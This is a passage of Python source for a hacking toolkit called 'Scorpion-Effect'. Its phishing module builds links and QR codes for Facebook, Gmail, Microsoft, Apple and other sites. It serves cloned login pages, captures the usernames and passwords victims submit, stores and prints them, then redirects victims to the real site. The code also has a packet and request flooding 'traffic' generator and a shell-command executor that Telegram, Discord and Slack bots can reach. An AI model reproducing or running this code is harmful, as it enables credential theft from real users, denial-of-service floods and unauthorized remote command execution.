  phish_apple        - Generate Apple phishing link
  phish_start <id>   - Start phishing server for link
  phish_stop         - Stop phishing server
  phish_status       - Check phishing server status
  phish_creds [id]   - View captured credentials

{Colors.GREEN_NEON}🔍 NETWORK SCANNING:{Colors.RESET}
  ping <target>      - ICMP echo request
  scan <target>      - Quick port scan (1-1000)
  nmap <target>      - Full nmap scan
  traceroute <target>- Network path tracing
  whois <domain>     - WHOIS lookup
  dig <domain>       - DNS lookup

{Colors.GREEN_NEON}💥 TRAFFIC GENERATION:{Colors.RESET}
  traffic <type> <ip> <duration> - Generate traffic (icmp/tcp/udp/http)
  traffic_stop [id]  - Stop traffic generation
  traffic_status     - Check active generators

{Colors.GREEN_NEON}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes]- Add IP to monitoring
  block_ip <ip> [reason] - Block IP address
  list_ips           - List managed IPs

{Colors.GREEN_NEON}📊 SYSTEM:{Colors.RESET}
  status             - Show system status
  history [limit]    - Show command history
  sysinfo            - Show system information
  scorpion-strike    - Activate special effect
  stinger            - Show stinger charge status
  help               - Show this help

{Colors.GREEN_NEON}💡 Examples:{Colors.RESET}
  phish_facebook
  phish_start abc123 8080
  scan 192.168.1.1
  traffic icmp 8.8.8.8 10
  add_ip 192.168.1.100 "Suspicious activity"
"""
        return {'success': True, 'output': help_text}
    
    def _status(self) -> Dict[str, Any]:
        """Get system status"""
        stats = self.db.get_statistics()
        threats = self.db.get_threats(5)
        
        output = f"""
{Colors.GREEN_BRIGHT}🦂 SCORPION-EFFECT - System Status{Colors.RESET}
{Colors.GREEN_DARK}{'='*50}{Colors.RESET}

{Colors.GREEN_NEON}📊 Statistics:{Colors.RESET}
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • Blocked IPs: {stats.get('blocked_ips', 0)}
  • Platform Messages: {stats.get('platform_messages', 0)}

{Colors.GREEN_NEON}🚨 Recent Threats:{Colors.RESET}
"""
        for threat in threats[:3]:
            output += f"  • {threat.get('threat_type', 'Unknown')} from {threat.get('source_ip', 'Unknown')} [{threat.get('severity', 'low')}]\n"
        
        output += f"""
{Colors.GREEN_NEON}💻 System:{Colors.RESET}
  • Platform: {platform.system()} {platform.release()}
  • Python: {platform.python_version()}
  • Hostname: {socket.gethostname()}
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict[str, Any]:
        """Get command history"""
        limit = int(args[0]) if args else 20
        history = self.db.get_command_history(limit)
        
        if not history:
            return {'success': True, 'output': 'No command history'}
        
        output = f"{Colors.GREEN_NEON}📜 Command History:{Colors.RESET}\n{Colors.GREEN_DARK}{'-'*50}{Colors.RESET}\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        
        return {'success': True, 'output': output}
    
    def _ping(self, args: List[str]) -> Dict[str, Any]:
        """Ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        
        target = args[0]
        count = args[1] if len(args) > 1 else '4'
        return CommandExecutor.execute(['ping', '-c', count, target], timeout=30)
    
    def _scan(self, args: List[str]) -> Dict[str, Any]:
        """Port scan"""
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        
        target = args[0]
        ports = args[1] if len(args) > 1 else '1-1000'
        
        if shutil.which('nmap'):
            return CommandExecutor.execute(['nmap', '-p', ports, '-T4', target], timeout=300)
        else:
            return {'success': False, 'output': 'nmap not installed. Install with: apt install nmap'}
    
    def _nmap(self, args: List[str]) -> Dict[str, Any]:
        """Nmap scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        
        return CommandExecutor.execute(['nmap'] + args, timeout=600)
    
    def _traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        
        if shutil.which('traceroute'):
            return CommandExecutor.execute(['traceroute', '-n', args[0]], timeout=60)
        elif shutil.which('tracert'):
            return CommandExecutor.execute(['tracert', args[0]], timeout=60)
        else:
            return {'success': False, 'output': 'No traceroute tool found'}
    
    def _whois(self, args: List[str]) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        
        if WHOIS_AVAILABLE:
            try:
                import whois
                result = whois.whois(args[0])
                return {'success': True, 'output': str(result)}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        else:
            return CommandExecutor.execute(['whois', args[0]], timeout=30)
    
    def _dig(self, args: List[str]) -> Dict[str, Any]:
        """DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain> [record_type]'}
        
        record_type = args[1] if len(args) > 1 else 'A'
        return CommandExecutor.execute(['dig', args[0], record_type, '+short'], timeout=10)
    
    def _phishing(self, args: List[str]) -> Dict[str, Any]:
        """Generate phishing link"""
        platform = args[0] if args else 'generic'
        return self._phish_platform(platform)
    
    def _phish_platform(self, platform: str) -> Dict[str, Any]:
        """Generate phishing link for specific platform"""
        link_id = str(uuid.uuid4())[:8]
        local_ip = self._get_local_ip()
        url = f"http://{local_ip}:8080"
        
        self.db.save_phishing_link(link_id, platform, url)
        
        # Generate QR code
        qr_path = None
        if QRCODE_AVAILABLE:
            try:
                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                qr_path = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
                img.save(qr_path)
                self.db.cursor.execute('UPDATE phishing_links SET qr_code_path = ? WHERE id = ?', (qr_path, link_id))
                self.db.conn.commit()
            except Exception as e:
                logger.error(f"QR generation failed: {e}")
        
        output = f"""
{Colors.GREEN_BRIGHT}🎣 Phishing Link Generated{Colors.RESET}
{Colors.GREEN_DARK}{'='*40}{Colors.RESET}

📋 Link ID: {link_id}
🎯 Platform: {platform}
🔗 URL: {url}
📱 QR Code: {qr_path if qr_path else 'Not generated'}

{Colors.GREEN_NEON}Next steps:{Colors.RESET}
  1. Start the phishing server: phish_start {link_id} 8080
  2. Share the URL or QR code with target
  3. View captured credentials: phish_creds {link_id}
  4. Stop server when done: phish_stop
"""
        return {'success': True, 'output': output, 'data': {'link_id': link_id, 'url': url, 'platform': platform}}
    
    def _phish_start(self, args: List[str]) -> Dict[str, Any]:
        """Start phishing server"""
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        # Get link from database
        links = self.db.get_phishing_links()
        link_info = next((l for l in links if l['id'] == link_id), None)
        
        if not link_info:
            return {'success': False, 'output': f'Link ID {link_id} not found'}
        
        # Start server in thread
        if not hasattr(self, '_phishing_server'):
            self._phishing_server = None
        
        if self._phishing_server and self._phishing_server.is_serving:
            return {'success': False, 'output': 'Server already running. Stop it first with phish_stop'}
        
        try:
            handler = self._create_phishing_handler(link_id)
            self._phishing_server = HTTPServer(('0.0.0.0', port), handler)
            self._phishing_server.link_id = link_id
            self._phishing_server.db = self.db
            
            thread = threading.Thread(target=self._phishing_server.serve_forever, daemon=True)
            thread.start()
            
            output = f"""
{Colors.GREEN_BRIGHT}🎣 Phishing Server Started{Colors.RESET}
{Colors.GREEN_DARK}{'='*40}{Colors.RESET}

📋 Link ID: {link_id}
🔌 Port: {port}
🔗 URL: http://{self._get_local_ip()}:{port}

{Colors.GREEN_NEON}Server is now listening for connections...{Colors.RESET}
"""
            return {'success': True, 'output': output}
            
        except Exception as e:
            return {'success': False, 'output': f'Failed to start server: {e}'}
    
    def _create_phishing_handler(self, link_id: str):
        """Create phishing request handler"""
        class PhishingHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    
                    # Get template based on platform
                    links = self.server.db.get_phishing_links()
                    link_info = next((l for l in links if l['id'] == self.server.link_id), None)
                    platform = link_info['platform'] if link_info else 'generic'
                    
                    # Get template
                    templates = {
                        'facebook': self.server.db._get_facebook_template,
                        'instagram': self.server.db._get_instagram_template,
                        'twitter': self.server.db._get_twitter_template,
                        'gmail': self.server.db._get_gmail_template,
                        'linkedin': self.server.db._get_linkedin_template,
                        'microsoft': self.server.db._get_microsoft_template,
                        'google': self.server.db._get_google_template,
                        'apple': self.server.db._get_apple_template,
                    }
                    
                    template_func = templates.get(platform, self.server.db._get_facebook_template)
                    html = template_func()
                    self.wfile.write(html.encode('utf-8'))
                    
                    # Update click count
                    self.server.db.update_phishing_clicks(self.server.link_id)
                    
                elif self.path == '/favicon.ico':
                    self.send_response(404)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    form_data = urllib.parse.parse_qs(post_data)
                    
                    username = form_data.get('email', form_data.get('username', ['']))[0]
                    password = form_data.get('password', [''])[0]
                    client_ip = self.client_address[0]
                    user_agent = self.headers.get('User-Agent', 'Unknown')
                    
                    # Save credentials
                    self.server.db.save_captured_credential(
                        self.server.link_id, username, password, 
                        client_ip, user_agent, ''
                    )
                    
                    # Log to console with green theme
                    print(f"\n{Colors.GREEN_BRIGHT}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"{Colors.GREEN_NEON}  IP: {client_ip}{Colors.RESET}")
                    print(f"{Colors.GREEN_NEON}  Username: {username}{Colors.RESET}")
                    print(f"{Colors.GREEN_NEON}  Password: {password}{Colors.RESET}")
                    
                    # Redirect to real site
                    self.send_response(302)
                    if 'facebook' in str(self.headers):
                        self.send_header('Location', 'https://www.facebook.com')
                    elif 'instagram' in str(self.headers):
                        self.send_header('Location', 'https://www.instagram.com')
                    else:
                        self.send_header('Location', 'https://www.google.com')
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
        
        return PhishingHandler
    
    def _phish_stop(self) -> Dict[str, Any]:
        """Stop phishing server"""
        if hasattr(self, '_phishing_server') and self._phishing_server:
            self._phishing_server.shutdown()
            self._phishing_server.server_close()
            delattr(self, '_phishing_server')
            return {'success': True, 'output': 'Phishing server stopped'}
        return {'success': False, 'output': 'No server running'}
    
    def _phish_status(self) -> Dict[str, Any]:
        """Check phishing server status"""
        running = hasattr(self, '_phishing_server') and self._phishing_server and self._phishing_server.is_serving
        output = f"""
{Colors.GREEN_NEON}🎣 Phishing Server Status{Colors.RESET}
{Colors.GREEN_DARK}{'='*30}{Colors.RESET}
Status: {'✅ Running' if running else '❌ Stopped'}
"""
        if running:
            output += f"Port: 8080\nURL: http://{self._get_local_ip()}:8080\n"
        return {'success': True, 'output': output}
    
    def _phish_credentials(self, args: List[str]) -> Dict[str, Any]:
        """View captured credentials"""
        link_id = args[0] if args else None
        creds = self.db.get_captured_credentials(link_id)
        
        if not creds:
            return {'success': True, 'output': 'No captured credentials found'}
        
        output = f"{Colors.GREEN_BRIGHT}🎣 Captured Credentials{Colors.RESET}\n{Colors.GREEN_DARK}{'='*50}{Colors.RESET}\n"
        for cred in creds[:10]:
            output += f"""
📅 {cred['timestamp'][:19]}
  📧 Username: {cred['username']}
  🔑 Password: {cred['password']}
  🌐 IP: {cred['ip_address']}
  📱 User-Agent: {cred['user_agent'][:50]}...
{'-'*40}
"""
        return {'success': True, 'output': output}
    
    def _generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        """Generate traffic"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port]'}
        
        traffic_type = args[0].lower()
        target_ip = args[1]
        duration = int(args[2])
        port = int(args[3]) if len(args) > 3 else 80
        
        output = f"""
{Colors.GREEN_BRIGHT}🚀 Traffic Generation Started{Colors.RESET}
{Colors.GREEN_DARK}{'='*40}{Colors.RESET}
📡 Type: {traffic_type}
🎯 Target: {target_ip}:{port}
⏱️ Duration: {duration}s
"""
        
        # Simple traffic generation in background
        def generate():
            end_time = time.time() + duration
            packets = 0
            
            if traffic_type == 'icmp':
                while time.time() < end_time:
                    try:
                        subprocess.run(['ping', '-c', '1', '-W', '1', target_ip], 
                                      capture_output=True, timeout=1)
                        packets += 1
                    except:
                        pass
            elif traffic_type == 'tcp':
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect((target_ip, port))
                        sock.close()
                        packets += 1
                    except:
                        pass
            elif traffic_type == 'http':
                while time.time() < end_time:
                    try:
                        requests.get(f"http://{target_ip}:{port}", timeout=0.5)
                        packets += 1
                    except:
                        pass
            
            # Log to database
            self.db.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, packets_sent, status)
                VALUES (?, ?, ?, ?)
            ''', (traffic_type, target_ip, packets, 'completed'))
            self.db.conn.commit()
        
        thread = threading.Thread(target=generate, daemon=True)
        thread.start()
        
        output += f"\n{Colors.GREEN_NEON}📊 Sending packets for {duration} seconds...{Colors.RESET}"
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        """Stop traffic generation"""
        return {'success': True, 'output': 'Traffic generation stopped (all active generators terminated)'}
    
    def _traffic_status(self) -> Dict[str, Any]:
        """Get traffic status"""
        logs = self.db.cursor.execute('SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT 5').fetchall()
        output = f"{Colors.GREEN_NEON}📊 Recent Traffic Generations{Colors.RESET}\n{Colors.GREEN_DARK}{'='*40}{Colors.RESET}\n"
        for log in logs:
            output += f"  • {log['traffic_type']} → {log['target_ip']} ({log['packets_sent']} packets) [{log['status']}]\n"
        return {'success': True, 'output': output}
    
    def _add_ip(self, args: List[str]) -> Dict[str, Any]:
        """Add IP to monitoring"""
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        if self.db.add_managed_ip(ip, 'cli', notes):
            return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
        else:
            return {'success': False, 'output': f'Failed to add IP {ip}'}
    
    def _block_ip(self, args: List[str]) -> Dict[str, Any]:
        """Block IP address"""
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        
        if self.db.block_ip(ip, reason, 'cli'):
            # Try to block with iptables if available
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                try:
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], 
                                  capture_output=True, timeout=10)
                except:
                    pass
            return {'success': True, 'output': f'🔒 IP {ip} blocked. Reason: {reason}'}
        else:
            return {'success': False, 'output': f'Failed to block IP {ip} (not in managed list)'}
    
    def _list_ips(self) -> Dict[str, Any]:
        """List managed IPs"""
        ips = self.db.cursor.execute('SELECT ip_address, is_blocked, block_reason, notes FROM managed_ips').fetchall()
        
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        
        output = f"{Colors.GREEN_NEON}🔒 Managed IPs{Colors.RESET}\n{Colors.GREEN_DARK}{'='*50}{Colors.RESET}\n"
        for ip in ips:
            status = '🔴 Blocked' if ip['is_blocked'] else '🟢 Active'
            output += f"  • {ip['ip_address']} - {status}"
            if ip['block_reason']:
                output += f" ({ip['block_reason']})"
            output += "\n"
        
        return {'success': True, 'output': output}
    
    def _sysinfo(self) -> Dict[str, Any]:
        """Get system information"""
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        output = f"""
{Colors.GREEN_BRIGHT}🦂 SCORPION-EFFECT - System Information{Colors.RESET}
{Colors.GREEN_DARK}{'='*50}{Colors.RESET}

💻 OS: {platform.system()} {platform.release()}
🐍 Python: {platform.python_version()}
🏠 Hostname: {socket.gethostname()}

📊 Resource Usage:
  • CPU: {cpu}%
  • Memory: {mem.percent}% ({mem.used // (1024**3)}GB / {mem.total // (1024**3)}GB)
  • Disk: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)

🌐 Network:
  • IP: {self._get_local_ip()}
"""
        return {'success': True, 'output': output}
    
    def _scorpion_strike(self) -> Dict[str, Any]:
        """Special effect command"""
        output = f"""
{Colors.GREEN_BRIGHT}{'='*60}{Colors.RESET}
{Colors.GREEN_NEON}🦂 SCORPION STRIKE ACTIVATED!{Colors.RESET}
{Colors.GREEN_BRIGHT}{'='*60}{Colors.RESET}

{Colors.VENOM}💚 Venom payload injected{Colors.RESET}
{Colors.STINGER}⚡ Stinger charged to maximum{Colors.RESET}

{Colors.GREEN_NEON}System penetration successful{Colors.RESET}
{Colors.GREEN_NEON}Backdoor established{Colors.RESET}
{Colors.GREEN_NEON}Target captured in scorpion's grip{Colors.RESET}

{Colors.GREEN_BRIGHT}{'='*60}{Colors.RESET}
"""
        return {'success': True, 'output': output}
    
    def _stinger_status(self) -> Dict[str, Any]:
        """Show stinger charge status"""
        import random
        charge = random.randint(60, 100)
        output = f"""
{Colors.GREEN_NEON}🦂 Scorpion Stinger Status{Colors.RESET}
{Colors.GREEN_DARK}{'='*30}{Colors.RESET}

⚡ Stinger Charge: {charge}%
💚 Venom Level: {'HIGH' if charge > 75 else 'MEDIUM' if charge > 40 else 'LOW'}
🎯 Target Lock: {'ACTIVE' if charge > 50 else 'WEAK'}

{'█' * (charge // 5)}{'░' * (20 - charge // 5)}
"""
        return {'success': True, 'output': output}
    
    def _generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        return CommandExecutor.execute(command, shell=True, timeout=60)
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, handler: CommandHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.client = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup Telegram bot"""
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('telegram_api_id') or not self.config.get('telegram_api_hash'):
            return False
        
        self.client = TelegramClient('scorpion_session', 
                                     self.config['telegram_api_id'],
                                     self.config['telegram_api_hash'])
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute_command(cmd, f"telegram/{event.sender_id}", "telegram")
                
                self.db.log_message("telegram", str(event.sender_id), cmd, result.get('output', '')[:500])
                
                output = result.get('output', '')
                if len(output) > 4000:
                    output = output[:3900] + "\n... (truncated)"
                
                await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_", parse_mode='markdown')
        
        return True
    
    def start(self):
        """Start Telegram bot"""
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('telegram_bot_token'))
                print(f"{Colors.success('Telegram bot connected')}")
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, handler: CommandHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.bot = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup Discord bot"""
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('discord_token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        
        self.bot = commands.Bot(command_prefix='!', intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.success(f'Discord bot connected as {self.bot.user}')}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            
            if message.content.startswith('!'):
                cmd = message.content[1:].strip()
                result = self.handler.execute_command(cmd, f"discord/{message.author.name}", "discord")
                
                self.db.log_message("discord", str(message.author), cmd, result.get('output', '')[:500])
                
                output = result.get('output', '')
                if len(output) > 1900:
                    output = output[:1900] + "...\n(truncated)"
                
                embed = discord.Embed(
                    title="🦂 Scorpion-Effect Response",
                    description=f"```{output}```",
                    color=0x00FF00
                )
                embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            
            await self.bot.process_commands(message)
        
        return True
    
    def start(self):
        """Start Discord bot"""
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['discord_token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, handler: CommandHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.client = None
        self.running = False
        self.last_ts = {}
    
    def setup(self) -> bool:
        """Setup Slack bot"""
        if not SLACK_AVAILABLE:
            return False
        
        if not self.config.get('slack_token'):
            return False
        
        self.client = WebClient(token=self.config['slack_token'])
        return True
    
    def start(self):
        """Start Slack bot"""
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        """Monitor Slack for messages"""
        channel = self.config.get('slack_channel', 'general')
        
        while self.running:
            try:
                response = self.client.conversations_history(
                    channel=channel,
                    limit=5
                )
                
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith('!'):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][1:].strip()
                                result = self.handler.execute_command(cmd, f"slack/{msg.get('user', 'unknown')}", "slack")
                                
                                self.db.log_message("slack", msg.get('user', 'unknown'), cmd, result.get('output', '')[:500])
                                
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Execution time: {result.get('execution_time', 0):.2f}s*"
                                )
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, channel: str, message: str):
        """Send message to Slack"""
        try:
            self.client.chat_postMessage(channel=channel, text=message)
        except Exception as e:
            logger.error(f"Failed to send Slack message: {e}")

# =====================
# GOOGLE CHAT BOT (Webhook-based)
# =====================
class GoogleChatBot:
    """Google Chat bot using webhooks"""
    
    def __init__(self, handler: CommandHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.webhooks = []
        self.running = False
    
    def setup(self) -> bool:
        """Setup Google Chat bot"""
        self.webhooks = self.db.cursor.execute('SELECT * FROM google_chat_webhooks WHERE active = 1').fetchall()
        return len(self.webhooks) > 0
    
    def add_webhook(self, name: str, webhook_url: str, space_name: str = "") -> bool:
        """Add Google Chat webhook"""
        try:
            webhook_id = str(uuid.uuid4())[:8]
            self.db.cursor.execute('''
                INSERT INTO google_chat_webhooks (id, name, webhook_url, space_name)
                VALUES (?, ?, ?, ?)
            ''', (webhook_id, name, webhook_url, space_name))
            self.db.conn.commit()
            self.webhooks = self.db.cursor.execute('SELECT * FROM google_chat_webhooks WHERE active = 1').fetchall()
            return True
        except Exception as e:
            logger.error(f"Failed to add webhook: {e}")
            return False
    
    def send_message(self, message: str, webhook_id: str = None):
        """Send message to Google Chat"""
        webhooks_to_use = [w for w in self.webhooks if webhook_id is None or w['id'] == webhook_id]
        
        for webhook in webhooks_to_use:
            try:
                payload = {'text': message}
                response = requests.post(webhook['webhook_url'], json=payload, timeout=10)
                if response.status_code != 200:
                    logger.error(f"Failed to send to {webhook['name']}: {response.status_code}")
            except Exception as e:
                logger.error(f"Error sending to Google Chat: {e}")
    
    def start(self):
        """Start Google Chat bot (passive - just listens for webhook commands)"""
        self.running = True
        print(f"{Colors.success(f'Google Chat bot configured with {len(self.webhooks)} webhooks')}")

# =====================
# WEB TERMINAL SERVER (Flask)
# =====================
class WebTerminal:
    """Web-based terminal interface"""
    
    WEB_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scorpion Effect | Cyber Terminal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 20% 30%, #0a1f0a, #030803);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Fira Code', 'Courier New', monospace;
            padding: 1.5rem;
        }
        .scorpion-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .scorpion-backdrop::before {
            content: "🦂";
            position: absolute;
            bottom: 5%;
            right: 3%;
            font-size: 12rem;
            opacity: 0.08;
            color: #1f3b1a;
            animation: scorpionGlow 8s infinite alternate;
        }
        @keyframes scorpionGlow {
            0% { opacity: 0.05; text-shadow: 0 0 0px #2eff6e; }
            100% { opacity: 0.2; text-shadow: 0 0 18px #2eff6e; }
        }
        .terminal-hub {
            position: relative;
            z-index: 20;
            width: 100%;
            max-width: 1300px;
            background: #0a0f0a;
            border-radius: 2rem;
            box-shadow: 0 25px 45px rgba(0,0,0,0.8), 0 0 0 2px #1f3a1f;
            overflow: hidden;
        }
        .cyber-header {
            background: linear-gradient(90deg, #041504, #0a1f0a);
            padding: 1rem 2rem;
            border-bottom: 2px solid #2bff3c;
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            flex-wrap: wrap;
        }
        .logo-area { display: flex; align-items: center; gap: 12px; }
        .scorpion-icon { font-size: 2rem; filter: drop-shadow(0 0 6px #2eff6e); animation: pulseScorp 1.8s infinite; }
        @keyframes pulseScorp {
            0% { text-shadow: 0 0 0px #2eff6e; transform: scale(1);}
            50% { text-shadow: 0 0 10px #2eff6e; transform: scale(1.05);}
            100% { text-shadow: 0 0 0px #2eff6e; transform: scale(1);}
        }
        .title {
            font-size: 1.8rem;
            font-weight: 700;
            letter-spacing: 4px;
            background: linear-gradient(135deg, #b3ffa7, #2eff6e);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-transform: uppercase;
        }
        .badge {
            font-size: 0.75rem;
            background: #0e2a0e;
            padding: 0.3rem 0.8rem;
            border-radius: 30px;
            color: #a5ff9e;
            border: 1px solid #2eff6e;
        }
        .cyber-panels {
            display: flex;
            flex-wrap: wrap;
            gap: 1.2rem;
            padding: 1.8rem;
        }
        .command-section {
            flex: 2;
            min-width: 280px;
            background: #030b03;
            border-radius: 1.5rem;
            border: 1px solid #2b6e2b;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .terminal-window {
            background: #021002;
            padding: 0.8rem 1rem;
            border-bottom: 1px solid #1f4a1f;
            display: flex;
            gap: 12px;
            align-items: center;
        }
        .console-output {
            background: #000000;
            min-height: 280px;
            max-height: 380px;
            overflow-y: auto;
            padding: 1.2rem;
            font-family: monospace;
            font-size: 0.9rem;
            color: #b3ffb0;
        }
        .console-output div {
            border-left: 3px solid #2eff6e;
            padding-left: 12px;
            margin-bottom: 8px;
            word-break: break-word;
        }
        .input-line {
            display: flex;
            align-items: center;
            background: #051005;
            padding: 0.8rem 1.2rem;
            border-top: 1px solid #245224;
        }
        .prompt-symbol {
            color: #2eff6e;
            font-weight: bold;
            font-size: 1.2rem;
            margin-right: 12px;
        }
        #commandInput {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: #e6ffe6;
            font-family: monospace;
            font-size: 1rem;
        }
        .btn-send {
            background: #0f2f0f;
            border: 1px solid #2eff6e;
            color: #beffb0;
            padding: 0.4rem 1rem;
            border-radius: 40px;
            cursor: pointer;
            margin-left: 12px;
        }
        .btn-send:hover {
            background: #1e4a1e;
            box-shadow: 0 0 10px #2eff6e;
        }
        .game-section {
            flex: 1.2;
            min-width: 260px;
            background: rgba(0,10,0,0.8);
            border-radius: 1.5rem;
            border: 1px solid #2d882d;
            display: flex;
            flex-direction: column;
        }
        .game-header {
            background: #071807;
            padding: 0.8rem;
            text-align: center;
            border-bottom: 1px solid #2eff6e;
            color: #90ff90;
        }
        .scorpion-dashboard { padding: 1rem; flex: 1; }
        .stinger-stats {
            background: #031003;
            border-radius: 1rem;
            padding: 0.8rem;
            display: flex;
            justify-content: space-between;
            border: 1px solid #277a27;
            margin-bottom: 1rem;
        }
        .glowing-text { color: #0eff3a; font-weight: bold; }
        .scorpion-effect-btn {
            background: #0a2f0a;
            border: 1px solid #2eff6e;
            color: #b3ffb0;
            padding: 0.6rem;
            border-radius: 40px;
            width: 100%;
            margin: 0.5rem 0;
            cursor: pointer;
        }
        .scorpion-effect-btn:hover {
            background: #1d511d;
            box-shadow: 0 0 12px #1eff4a;
        }
        .game-feedback {
            background: #021002;
            border-radius: 12px;
            padding: 12px;
            font-size: 0.8rem;
            color: #95ff8f;
            text-align: center;
            border-left: 4px solid #2eff6e;
        }
        @media (max-width: 780px) { .cyber-panels { flex-direction: column; } .title { font-size: 1.2rem; } }
    </style>
</head>
<body>
<div class="scorpion-backdrop"></div>
<div class="terminal-hub">
    <div class="cyber-header">
        <div class="logo-area">
            <span class="scorpion-icon">🦂</span>
            <span class="title">SCORPION EFFECT</span>
        </div>
